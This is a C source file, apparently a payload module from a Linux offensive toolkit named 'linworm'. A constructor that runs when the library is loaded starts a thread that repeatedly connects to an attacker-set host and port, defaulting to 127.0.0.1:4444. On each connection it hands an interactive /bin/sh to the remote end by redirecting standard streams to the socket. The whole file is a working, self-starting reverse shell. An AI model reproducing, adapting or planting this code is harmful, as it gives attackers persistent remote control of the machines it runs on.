#include "common.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define RSHELL_LOG     "/tmp/linworm_rshell.log"
#define DEFAULT_RHOST  "127.0.0.1"
#define DEFAULT_RPORT  4444
#define RECONNECT_MS   5000

static int create_connection(const char *host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

static void *rshell_thread(void *arg) {
    (void)arg;

    const char *host = getenv("LINWORM_RHOST");
    const char *port_str = getenv("LINWORM_RPORT");
    if (!host) host = DEFAULT_RHOST;
    int port = port_str ? atoi(port_str) : DEFAULT_RPORT;

    payload_log(RSHELL_LOG, "reverse_shell started (pid=%d, target=%s:%d)",
                getpid(), host, port);

    while (payload_running()) {
        payload_log(RSHELL_LOG, "connecting to %s:%d...", host, port);
        int sock = create_connection(host, port);
        if (sock < 0) {
            payload_log(RSHELL_LOG, "connection failed, retrying in %d ms",
                        RECONNECT_MS);
            payload_sleep_ms(RECONNECT_MS);
            continue;
        }
        payload_log(RSHELL_LOG, "connected (fd=%d)", sock);

        pid_t child = fork();
        if (child == 0) {
            dup2(sock, STDIN_FILENO);
            dup2(sock, STDOUT_FILENO);
            dup2(sock, STDERR_FILENO);
            close(sock);
            if (g_pipe_fd[0] >= 0) close(g_pipe_fd[0]);
            if (g_pipe_fd[1] >= 0) close(g_pipe_fd[1]);
            char *argv[] = {"/bin/sh", "-i", NULL};
            execve("/bin/sh", argv, NULL);
            _exit(127);
        }

        if (child < 0) {
            payload_log(RSHELL_LOG, "fork failed");
            close(sock);
            payload_sleep_ms(RECONNECT_MS);
            continue;
        }

        while (payload_running()) {
            int status;
            pid_t w = waitpid(child, &status, WNOHANG);
            if (w > 0) {
                payload_log(RSHELL_LOG,
                            "shell exited (status=%d), will reconnect",
                            WEXITSTATUS(status));
                break;
            }
            payload_sleep_ms(1000);
        }

        if (kill(child, 0) == 0) {
            kill(child, SIGTERM);
            waitpid(child, NULL, 0);
        }
        close(sock);
    }

    payload_log(RSHELL_LOG, "reverse_shell shutting down");
    return NULL;
}

__attribute__((constructor))
void on_load(void) {
    if (payload_init() == 0)
        payload_start(rshell_thread);
}

__attribute__((destructor))
void on_unload(void) {
    if (g_pipe_fd[0] != -1)
        payload_stop();
}
